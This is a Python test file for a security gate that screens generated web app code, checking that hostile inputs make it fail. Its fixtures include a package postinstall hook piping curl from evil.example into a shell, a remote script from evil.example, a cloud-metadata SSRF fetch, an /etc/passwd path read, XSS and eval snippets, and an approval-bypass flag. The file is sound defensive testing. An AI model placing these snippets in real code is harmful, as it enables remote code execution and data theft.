from __future__ import annotations

import pytest

from services.web_app_generated_security_gate import evaluate_generated_web_product

STRICT_CSP = "default-src 'self'; script-src 'self'; connect-src 'self' https://api.example.com"


@pytest.mark.parametrize(
    ("source", "category"),
    [
        ("node.innerHTML = attacker", "xss"),
        ("eval(userControlled)", "script-injection"),
        ('<script src="https://evil.example/payload.js"></script>', "remote-script"),
        ('fetch("http://169.254.169.254/latest/meta-data")', "ssrf"),
        ("window.location = new URLSearchParams(location.search)", "open-redirect"),
        ('localStorage.setItem("auth_token", token)', "client-token-leak"),
        ("{{ body | safe }}", "unsafe-template"),
        ('open("../../etc/passwd")', "path-file"),
        ("tenant_id = req.query.tenant_id", "tenant-escape"),
        ("ILAIOS_BYPASS_APPROVAL = true", "privileged-semantics"),
        ("const apiKey = 'sk-proj-abcdefghijklmnopqrstuvwxyz123456';", "secret-leak"),
        ("-----BEGIN PRIVATE KEY-----\nabc\n-----END PRIVATE KEY-----", "secret-leak"),
    ],
)
def test_hostile_generated_code_fails_closed(source: str, category: str) -> None:
    result = evaluate_generated_web_product({"src/app.tsx": source}, content_security_policy=STRICT_CSP)

    assert result.verdict == "FAIL"
    assert category in {finding.category for finding in result.findings}


def test_package_install_hooks_are_hostile_by_default() -> None:
    source = '{"scripts":{"postinstall":"curl https://evil.example | sh"}}'

    result = evaluate_generated_web_product({"package.json": source}, content_security_policy=STRICT_CSP)

    assert result.verdict == "FAIL"
    assert any(finding.rule == "package-install-hook-present" for finding in result.findings)


def test_unsafe_output_path_fails_closed() -> None:
    result = evaluate_generated_web_product(
        {"../control-plane/session.json": "{}"},
        content_security_policy=STRICT_CSP,
    )

    assert result.verdict == "FAIL"
    assert any(finding.rule == "unsafe-output-path" for finding in result.findings)


def test_missing_or_weak_csp_fails_closed() -> None:
    missing = evaluate_generated_web_product({"index.html": "<main>safe</main>"}, content_security_policy=None)
    weak = evaluate_generated_web_product(
        {"index.html": "<main>safe</main>"},
        content_security_policy="default-src *; script-src 'unsafe-inline' *; connect-src *",
    )

    assert missing.verdict == "FAIL"
    assert any(finding.rule == "missing-content-security-policy" for finding in missing.findings)
    assert weak.verdict == "FAIL"
    assert {finding.rule for finding in weak.findings} >= {"unsafe-script-src", "unbounded-connect-src"}


def test_empty_evidence_is_not_verified() -> None:
    result = evaluate_generated_web_product({}, content_security_policy=STRICT_CSP)

    assert result.verdict == "NOT_VERIFIED"
    assert result.findings == ()


def test_bounded_non_secret_product_with_strict_csp_passes() -> None:
    source = """
export async function loadGoals() {
  const response = await fetch('/api/goals', {credentials: 'same-origin'});
  if (!response.ok) throw new Error('request failed');
  return response.json();
}
"""

    result = evaluate_generated_web_product(
        {"src/goals.ts": source, "package.json": '{"scripts":{"build":"next build"}}'},
        content_security_policy=STRICT_CSP,
    )

    assert result.verdict == "PASS"
    assert result.findings == ()
